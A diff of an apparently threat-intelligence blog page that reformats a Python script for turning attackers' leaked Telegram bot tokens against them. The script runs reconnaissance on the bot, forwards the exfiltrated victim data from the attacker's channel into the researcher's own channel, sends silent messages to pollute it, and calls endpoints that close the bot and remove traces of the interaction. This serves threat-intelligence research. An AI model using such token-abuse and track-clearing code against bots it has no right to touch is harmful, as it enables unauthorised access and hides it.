@@ -11,7 +11,7 @@ tags: threat-intel
     pre{
   counter-reset:line-numbering;
   background:#2c3e50;
-  padding:12px 0px 14px 0;
+  padding:14px 14px 14px 14px;
   width:600px;
   color:#ecf0f1;
   line-height:140%;
@@ -62,21 +62,7 @@ THE FOLLOWING WORKFLOWS SHOULD NOT BE USED AGAINST NON-ATTACKER CHANNELS. WE ONL
     URL = f"https://api.telegram.org/{BOT_TOKENS[USING]}/" 
 </pre>
 
-<!-- ```python
-from datetime import datetime
-import requests
-import time
-import os
-
-USING = "BOT_TOKEN1"
-
-BOT_TOKENS = {"BOT_TOKEN1": "{BOT-TOKEN}"}
-
-CHANNEL_IDS = {"BOT_TOKEN1": "{BOT-CHANNEL}"}
-
-MY_CHANNEL_IDS = {"BOT_TOKEN1": "{YOUR-CHANNEL}"}
-
-URL = f"https://api.telegram.org/{BOT_TOKENS[USING]}/" 
+<pre>
 
 # Workflow that will gather data specific to the channel that the attackers are using to exfiltrate data. If the channel ID is not known, you can use 
 # determine this value by interacting with the attacker's bot; the response you receive will likely contain the ID of the channel used to exfiltrate victim data
@@ -86,6 +72,10 @@ channel_endpoints = {
     "getChatMembersCount":f"getChatMembersCount?chat_id={CHANNEL_IDS[USING]}",
     "createChatInviteLink":f"createChatInviteLink?chat_id={CHANNEL_IDS[USING]}",
 }
+
+</pre>
+
+<pre>
 
 # Workflow that will gather data on the bot, such as 
 # - Name
@@ -103,6 +93,10 @@ gen_endpoints = {
     "getWebhookInfo":"getWebhookInfo",
 }
 
+</pre>
+
+<pre>
+
 # Workflow that will remove evidence of your interaction with the attacker's bot. These endpoints will
 # - Leave the chat you created to enumerate stolen data
 # - Close the bot
@@ -113,16 +107,28 @@ clear_tracks = {
     "logOut":f"logOut"
 }
 
+</pre>
+
+<pre>
+
 # Workflow that will send data specified by you to the attacker's channel. By default, this workflow sends empty messages, and disables notifications, so as to minimize the likelihood that the attacker will immediately detect any anomolous behavior. You may use this workflow to pollute the attacker's
 # dataset, enumerate channel ID(s), etc.
 sendMessage = {
     "sendMessage":f"sendMessage?text=''&chat_id={MY_CHANNEL_IDS[USING]}&disable_notification=True"
 }
 
+</pre>
+
+<pre>
+
 # Workflow to enumerate what data the attackers have stolen. 
 forwardMessage = {
     "forwardMessage": f"forwardMessage?chat_id={MY_CHANNEL_IDS[USING]}&from_chat_id={CHANNEL_IDS[USING]}&message_id="
 }
+
+</pre>
+
+<pre>
 
 folder = f"{USING}-{datetime.today().strftime('%m-%d-%y')}"
 try:
@@ -131,16 +137,27 @@ except:
     print("Folder already exists")
 os.chdir(f"{folder}")
 
+</pre>
+
+<pre>
+
+# This method will enumerate the contents of the attacker's chat, according to the message IDS that are 
+# entered into X and Y (e.g., (0,1000) will gather the messages with IDs between 0 and 999).
 def enumerate():
     for inc in range(X,Y): 
         for key in forwardMessage.keys():
             looking_at = key
             response = requests.get(URL+forwardMessage[looking_at]+str(inc))
-            print(response.text)
-            if "Too Many Requests: retry after" not in response.text and "Bad Request: message to forward not found" not in response.text:
+            if "Bad Request: message to forward not found" not in response.text:
                 with open(f"{looking_at}.json","a") as a:
                     a.write(f"{response.text}\n")
-    
+
+</pre>
+
+<pre>
+
+# This method queries the specific endpoint name that you enter as a parameter, so long as it's dictionary
+# value exists elsewhere in the code.
 def query_endpoint(endpoint):
     for key in endpoint.keys():
         looking_at = key
@@ -150,11 +167,23 @@ def query_endpoint(endpoint):
             with open(f"{looking_at}.json","a") as a:
                 a.write(f"{response.text}\n")
 
+</pre>
+
+<pre>
+# Gathers preliminary data on the attacker's Telegram channel, as well as information about the bot 
+# itself.
 def initial_recon():
     query_endpoint(gen_endpoints)
     query_endpoint(channel_endpoints)
 
-STAGE = "3"
+</pre>
+
+<pre>
+
+# Define which stage of operations you want to execute (reconnaissance,enumeration, or clearing evidence
+# of involvement)
+
+STAGE = "#"
 
 match STAGE:
     case "1":
@@ -165,7 +194,8 @@ match STAGE:
         query_endpoint(clear_tracks)
 
 os.chdir("..")
-``` -->
+</pre>
+
 <script>
 $("pre").html(function (index, html) {
     return html.replace(/^(.*)$/mg, "<span 
